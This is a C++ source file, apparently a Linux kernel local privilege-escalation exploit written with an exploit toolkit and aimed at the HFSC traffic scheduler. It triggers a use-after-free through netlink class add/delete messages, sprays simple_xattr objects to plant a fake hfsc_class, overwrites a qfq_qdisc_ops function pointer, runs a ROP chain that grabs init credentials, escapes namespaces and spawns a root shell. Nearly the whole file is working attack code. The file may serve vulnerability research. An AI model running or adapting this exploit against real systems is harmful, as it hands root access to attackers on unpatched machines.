// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <errno.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <sys/syscall.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/if_arp.h>

#include <cassert>

#include <xdk/core.h>
#include <xdk/postrip.h>

/* simple_xattr spray */
const int xattr_spray = 32;
const int xattr_slab_len = 1024;
const int xattr_data_len = xattr_slab_len/2;

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while(0)

INCBIN(target_db, "target_db.kxdb");

struct tf_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
#define TC_DATA_LEN 512
    char attrbuf[TC_DATA_LEN];
};

struct if_msg {
    struct nlmsghdr nh;
    struct ifinfomsg ifi;
};

/* Netlink message for setting loopback up. */
struct if_msg if_up_msg = {
    {
        .nlmsg_len = 32,
        .nlmsg_type = RTM_NEWLINK,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
    },
    {
        .ifi_family = AF_UNSPEC,
        .ifi_type = ARPHRD_NETROM,
        .ifi_index = 1,
        .ifi_flags = IFF_UP,
        .ifi_change = 1,
    },

};

int xattr_fd;

void pin_cpu (int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
        err_exit("[-] sched_setaffinity");
}

/* Helper functions for creating rtnetlink messages. */

unsigned short add_rtattr (struct rtattr *rta, unsigned short type, unsigned short len, const void *data) {
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    return rta->rta_len;
}

int vuln_class_id = 0x00010001; // 1:1, classid of vulnerable RSC parent.
int def_class_id = 0x00010002; // 1:2, classid where packets are enqueued.
struct tf_msg newqd_msg, newc_msg, delc_msg, new_rsc_msg, new_fsc_msg, new_qfq_qdisc;

void init_tf_msg (struct tf_msg *m) {
    m->nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    m->tm.tcm_family = PF_UNSPEC;
    m->tm.tcm_ifindex = if_nametoindex("lo");
    m->nh.nlmsg_len = NLMSG_LENGTH(sizeof(m->tm));
    m->tm.tcm_parent = TC_H_MAKE(1 << 16, 0);
    m->tm.tcm_info = TC_H_MAKE(1 << 16, 3 << 8); //(prio << 16, protocol << 8)
    m->nh.nlmsg_seq = 1;
}

void init_qdisc_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWQDISC;
    m->tm.tcm_parent = -1;
    m->tm.tcm_handle = 1 << 16;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
    short def = 2;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_OPTIONS, 2, &def));
}


void init_rsc_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWTCLASS;
    m->tm.tcm_parent = 1 << 16;
    m->tm.tcm_handle = vuln_class_id;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    int rsc[3] = {1, 1, 1};
    opts->rta_len += RTA_ALIGN(add_rtattr((rtattr *)((char *)opts + opts->rta_len), TCA_HFSC_RSC, sizeof(rsc), rsc));
    m->nh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
}

void init_fsc_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWTCLASS;
    m->tm.tcm_parent = vuln_class_id;
    m->tm.tcm_handle = def_class_id;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    int fsc[3] = {1, 1, 1};
    opts->rta_len += RTA_ALIGN(add_rtattr((rtattr *)((char *)opts + opts->rta_len), TCA_HFSC_FSC, sizeof(fsc), fsc));
    m->nh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
}

void init_del_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    m->nh.nlmsg_type = RTM_DELTCLASS;
    m->tm.tcm_handle = vuln_class_id;
}

void init_qfq_qdisc_msg (struct tf_msg *m, const Payload& payload) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWQDISC;
    m->tm.tcm_parent = 0x00010002;
    m->tm.tcm_handle = 2 << 16;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("qfq") + 1, "qfq"));
    auto data = payload.GetUsedData();
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_OPTIONS, data.size() - 4, data.data() + 4));
}

void init_nl_msgs (void) {
    init_qdisc_msg(&newqd_msg);
    init_del_class_msg(&delc_msg);
    init_rsc_class_msg(&new_rsc_msg);
    init_fsc_class_msg(&new_fsc_msg);
}

/*
 * Send a Netlink message and check for error
 */
void netlink_write (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack;
    if (write(sock, m, m->nh.nlmsg_len) == -1)
        err_exit("[-] write");
    if (read(sock , &ack, sizeof(ack)) == -1)
        err_exit("[-] read");
    if (ack.ne.error) {
        errno = -ack.ne.error;
        perror("[-] netlink");
    }
}

void netlink_write_noerr (int sock, struct tf_msg *m) {
    if (write(sock, m, m->nh.nlmsg_len) == -1)
        err_exit("[-] write");
}

/*
 * Send a message on the loopback device. Used to trigger qdisc enqueue and
 * dequeue functions.
 */
void loopback_send (void) {
    struct sockaddr iaddr = { AF_INET };
    int inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    if (inet_sock_fd == -1)
        err_exit("[-] inet socket");
    if (connect(inet_sock_fd, &iaddr, sizeof(iaddr)) == -1)
        err_exit("[-] connect");
    if (write(inet_sock_fd, "", 1) == -1)
        err_exit("[-] inet write");
    close(inet_sock_fd);
}

int main (int argc, char **argv) {
    long kernel_base;

    TargetDb kxdb("target_db.kxdb", target_db);
    auto target = kxdb.AutoDetectTarget();
    printf("[+] Running on target: %s %s\n", target.GetDistro().c_str(), target.GetReleaseName().c_str());

    pin_cpu(0);

    if (argc > 1) {
        kernel_base = strtoul(argv[1], NULL, 16);
        printf("[*] Using provided kernel base: 0x%lx\n", kernel_base);
    } else {
        printf("[*] Kernel base is not provided!!!\n");
        exit(EXIT_FAILURE);
    }

    char xattr_buf[xattr_data_len];
    auto xattr_header_size = target.GetStructSize("simple_xattr");
    char* fake_hsfc = xattr_buf - xattr_header_size;

    /* Data offsets */
    auto qfq_change_qdisk_loc = target.GetSymbolOffset("qfq_qdisc_ops") + target.GetFieldOffset("Qdisc_ops", "change");
    printf("[+] qfq_change_qdisk_loc: 0x%lx\n", qfq_change_qdisk_loc);

    check_kaslr_base(kernel_base);

    if (unshare(CLONE_NEWUSER) == -1)
        err_exit("[-] unshare(CLONE_NEWUSER)");
    if (unshare(CLONE_NEWNET) == -1)
        err_exit("[-] unshare(CLONE_NEWNET)");

    /* Open temporary file to use for xattr spray */
    xattr_fd = open("/tmp/", O_TMPFILE | O_RDWR, 0664);
    if (xattr_fd == -1)
        err_exit("[-] open");

    /* Open socket to send netlink commands to */
    int nl_sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (nl_sock_fd == -1)
        err_exit("[-] nl socket");

    /* Set loopback device up */
    if_up_msg.ifi.ifi_index = if_nametoindex("lo");
    netlink_write(nl_sock_fd, (tf_msg *)&if_up_msg);

    init_nl_msgs();

    /* Trigger vuln */
    netlink_write(nl_sock_fd, &newqd_msg);
    netlink_write(nl_sock_fd, &new_rsc_msg);
    netlink_write(nl_sock_fd, &new_fsc_msg);
    loopback_send();
    delc_msg.tm.tcm_handle = def_class_id;
    netlink_write(nl_sock_fd, &delc_msg);

    printf("[+] ROP chain:\n");
    RopChain rop(target, kernel_base);
    rop.AddRopAction(RopActionId::COMMIT_INIT_TASK_CREDS);
    rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, {1});
    rop.AddRopAction(RopActionId::TELEFORK, {100000});
    HexDump::Print(rop.GetData());

    Payload payload(256);
    payload.Reserve(0, 4);

    PayloadBuilder builder(target.GetPivots(), kernel_base); // create builder

    builder.AddPayload(payload, Register::RSI, 4); // add payload, with register, and rip_offset
    builder.AddRopChain(rop); // add a rop chain
    if(!builder.Build()) exit(-1); // build it

    builder.PrintDebugInfo();

    printf("[+] Stack pivot and ROP part of payload:\n");
    HexDump::Print(payload.GetData());
    printf("Stack pivot and ROP part of payload: %ld\n", payload.GetData().size());

    /* Place fake hfsc_class in xattr */
    /* hfsc_class.level = 1 (must be non-zero) */
    // TODO(feat): create a FakeObject class which is a data-view on Payload (with fake object offset) and
    //             makes it possible to set fields like: fake_hsfc.SetField("level", 1) using the right size
    auto level_offset = target.GetFieldOffset("hfsc_class", "level");
    fake_hsfc[level_offset] = 1;
    /* hfsc_class.vt_node = 1 (must be odd) */
    auto vt_node_offset = target.GetFieldOffset("hfsc_class", "vt_node.__rb_parent_color");
    fake_hsfc[vt_node_offset] = 1;
    /* hfsc_class.cf_node = 1 (must be odd) */
    auto cf_node_offset = target.GetFieldOffset("hfsc_class", "cf_node.__rb_parent_color");
    fake_hsfc[cf_node_offset] = 1;

    /* hfsc_class.parent = &qfq_change_qdisc (write target)*/
    auto cl_cvtmin_offset = target.GetFieldOffset("hfsc_class", "cl_cvtmin");
    long parent = kernel_base + qfq_change_qdisk_loc - cl_cvtmin_offset;

    auto cl_parent_offset = target.GetFieldOffset("hfsc_class", "cl_parent");
    memcpy(fake_hsfc + cl_parent_offset, &parent, 8);

    /* hfsc_class.cl_vt = jop_gadget (write value) */
    long cl_vt = kernel_base + builder.GetStackPivot().GetGadgetOffset();
    printf("[*] cl_vt: 0x%lx\n", cl_vt);

    auto cl_vt_offset = target.GetFieldOffset("hfsc_class", "cl_vt");
    memcpy(fake_hsfc + cl_vt_offset, &cl_vt, 8);

    printf("[*] Spraying simple_xattrs...\n");
    /* Spray simple_xattrs */
    delc_msg.tm.tcm_handle = vuln_class_id;
    netlink_write(nl_sock_fd, &delc_msg);

    /* Allocate simple_xattr objects */
    char name[32];
    for (int i = 0; i < xattr_spray; i++) {
        sprintf(name, "security.%d", i);
        if (fsetxattr(xattr_fd, name, xattr_buf, xattr_data_len, 0) == -1)
            err_exit("[-] fsetxattr");
    }

    /* Create new default class and trigger enqueue/dequeue to overwrite
     * qfq_change_qdisc with jop gadget */
    new_fsc_msg.tm.tcm_parent = 1 << 16;
    netlink_write(nl_sock_fd, &new_fsc_msg);

    printf("[*] Overwriting function pointer\n");
    loopback_send();

    /* Call overwritten function pointer */
    init_qfq_qdisc_msg(&new_qfq_qdisc, payload);
    netlink_write_noerr(nl_sock_fd, &new_qfq_qdisc);
    printf("[*] Triggering ROP chain\n");
    netlink_write_noerr(nl_sock_fd, &new_qfq_qdisc);

    if (getuid()) {
        printf("[-] Privesc failed\n");
        exit(EXIT_FAILURE);
    }

    printf("[+] Returned from ROP\n");

    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    if (mntns_fd == -1)
        perror("[-] open(/proc/1/ns/mnt)");

    int netns_fd = open("/proc/1/ns/net", O_RDONLY);
    if (netns_fd == -1)
        perror("[-] open(/proc/1/ns/net)");

    int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);
    if (pidns_fd == -1)
        perror("[-] open(/proc/1/ns/pid)");

    if (setns(mntns_fd, CLONE_NEWNS) == -1)
        perror("[-] setns mnt");
    if (setns(netns_fd, CLONE_NEWNET) == -1)
        perror("[-] setns net");
    if (setns(pidns_fd, CLONE_NEWPID) == -1)
        perror("[-] setns pid");

    printf("[*] Launching shell\n");
    system("/bin/sh");
}
